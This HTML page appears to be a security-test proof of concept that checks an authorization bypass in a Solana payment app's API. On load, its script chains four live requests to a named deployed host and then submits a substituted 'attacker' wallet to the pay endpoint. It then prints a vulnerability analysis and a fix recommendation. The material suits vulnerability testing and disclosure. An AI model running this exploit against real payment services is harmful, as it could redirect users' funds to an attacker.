<!DOCTYPE html>
<html>
<head>
    <title>AUTHZ-VULN-03 Test</title>
    <style>
        body {
            font-family: monospace;
            padding: 20px;
            background: #1e1e1e;
            color: #d4d4d4;
        }
        .step {
            border: 1px solid #444;
            padding: 15px;
            margin: 10px 0;
            background: #252526;
        }
        .success { color: #4ec9b0; }
        .error { color: #f48771; }
        .warning { color: #dcdcaa; }
        .critical {
            color: #f48771;
            font-weight: bold;
            font-size: 1.2em;
        }
        pre {
            background: #1e1e1e;
            padding: 10px;
            overflow-x: auto;
            border-left: 3px solid #007acc;
        }
        .header {
            border-bottom: 2px solid #007acc;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>AUTHZ-VULN-03: Arbitrary Wallet Address Test</h1>
        <p>Testing if POST /api/pay accepts arbitrary wallet addresses without validation</p>
    </div>

    <div id="output"></div>

    <script>
        const BASE_URL = "https://solana-blik.vercel.app";
        const output = document.getElementById('output');

        function log(message, className = '') {
            const div = document.createElement('div');
            div.className = className;
            div.innerHTML = message;
            output.appendChild(div);
        }

        function logStep(stepNum, title) {
            const div = document.createElement('div');
            div.className = 'step';
            div.innerHTML = `<h2>STEP ${stepNum}: ${title}</h2>`;
            output.appendChild(div);
            return div;
        }

        function logResponse(stepDiv, response, data) {
            stepDiv.innerHTML += `
                <p><strong>Status:</strong> ${response.status}</p>
                <p><strong>Response:</strong></p>
                <pre>${JSON.stringify(data, null, 2)}</pre>
            `;
        }

        async function runTest() {
            try {
                // Step 1: Create payment
                const step1Div = logStep(1, 'Create Legitimate Payment');
                step1Div.innerHTML += `<p>POST ${BASE_URL}/api/payments/create</p>`;
                step1Div.innerHTML += `<p>Body: {"amount": 0.5, "merchantWallet": "11111111111111111111111111111111"}</p>`;

                const step1Response = await fetch(`${BASE_URL}/api/payments/create`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        amount: 0.5,
                        merchantWallet: "11111111111111111111111111111111"
                    })
                });

                const step1Data = await step1Response.json();
                logResponse(step1Div, step1Response, step1Data);

                if (!step1Data.id) {
                    log('❌ Failed to get payment ID', 'error');
                    return;
                }

                const paymentId = step1Data.id;
                step1Div.innerHTML += `<p class="success">✓ Payment created: ${paymentId}</p>`;

                // Step 2: Generate code
                const step2Div = logStep(2, 'Generate Code for Legitimate Wallet');
                step2Div.innerHTML += `<p>POST ${BASE_URL}/api/codes/generate</p>`;
                step2Div.innerHTML += `<p>Body: {"walletPubkey": "22222222222222222222222222222222"}</p>`;

                const step2Response = await fetch(`${BASE_URL}/api/codes/generate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        walletPubkey: "22222222222222222222222222222222"
                    })
                });

                const step2Data = await step2Response.json();
                logResponse(step2Div, step2Response, step2Data);

                if (!step2Data.code) {
                    log('❌ Failed to get BLIK code', 'error');
                    return;
                }

                const blikCode = step2Data.code;
                step2Div.innerHTML += `<p class="success">✓ Code generated: ${blikCode}</p>`;

                // Step 3: Link code to payment
                const step3Div = logStep(3, 'Link Code to Payment');
                step3Div.innerHTML += `<p>POST ${BASE_URL}/api/payments/link</p>`;
                step3Div.innerHTML += `<p>Body: {"paymentId": "${paymentId}", "code": "${blikCode}"}</p>`;

                const step3Response = await fetch(`${BASE_URL}/api/payments/link`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        paymentId: paymentId,
                        code: blikCode
                    })
                });

                const step3Data = await step3Response.json();
                logResponse(step3Div, step3Response, step3Data);

                if (step3Response.status !== 200) {
                    log('❌ Failed to link code', 'error');
                    return;
                }

                step3Div.innerHTML += `<p class="success">✓ Code linked successfully</p>`;

                // Step 4: EXPLOIT - Try different wallet
                const step4Div = logStep(4, 'EXPLOIT ATTEMPT - Use Different Attacker Wallet');
                step4Div.innerHTML += `<p class="warning">⚠️  CRITICAL TEST: Using ATTACKER wallet (33333...) instead of legitimate wallet (22222...)</p>`;
                step4Div.innerHTML += `<p>POST ${BASE_URL}/api/pay</p>`;
                step4Div.innerHTML += `<p>Body: {"paymentId": "${paymentId}", "account": "33333333333333333333333333333333"}</p>`;

                const step4Response = await fetch(`${BASE_URL}/api/pay`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        paymentId: paymentId,
                        account: "33333333333333333333333333333333"
                    })
                });

                const step4Data = await step4Response.json();
                logResponse(step4Div, step4Response, step4Data);

                // Analysis
                const analysisDiv = document.createElement('div');
                analysisDiv.className = 'step';
                analysisDiv.innerHTML = '<h2>VULNERABILITY ANALYSIS</h2>';

                if (step4Response.status === 200) {
                    analysisDiv.innerHTML += `
                        <p class="critical">🚨 VULNERABILITY CONFIRMED! 🚨</p>
                        <p>The endpoint accepted an arbitrary wallet address that doesn't match the payment owner.</p>
                        <p>This is a critical authorization bypass vulnerability.</p>
                        <h3>ATTACK SCENARIO:</h3>
                        <ul>
                            <li>Legitimate customer (wallet 22222...) created and linked payment</li>
                            <li>Attacker intercepted the paymentId</li>
                            <li>Attacker successfully substituted their wallet (33333...)</li>
                            <li>Transaction would send funds to attacker instead of legitimate customer</li>
                        </ul>
                    `;

                    if (step4Data.transaction) {
                        analysisDiv.innerHTML += `
                            <h3>TRANSACTION DETAILS:</h3>
                            <ul>
                                <li>Transaction generated: YES</li>
                                <li>Transaction length: ${step4Data.transaction.length} characters</li>
                                ${step4Data.receiptPda ? `<li>Receipt PDA: ${step4Data.receiptPda}</li>` : ''}
                                ${step4Data.amount ? `<li>Amount: ${step4Data.amount}</li>` : ''}
                            </ul>
                        `;
                    }

                    analysisDiv.innerHTML += `
                        <h3>RECOMMENDATION:</h3>
                        <p>The /api/pay endpoint MUST verify that the provided 'account' parameter matches the wallet address associated with the payment's linked code.</p>
                    `;
                } else {
                    analysisDiv.innerHTML += `
                        <p class="success">✓ VULNERABILITY NOT EXPLOITABLE</p>
                        <p>The endpoint rejected the arbitrary wallet address (status ${step4Response.status})</p>
                        <p>The authorization check appears to be working correctly.</p>
                    `;
                }

                output.appendChild(analysisDiv);

            } catch (error) {
                log(`❌ Error: ${error.message}`, 'error');
                console.error(error);
            }
        }

        // Run test on page load
        runTest();
    </script>
</body>
</html>
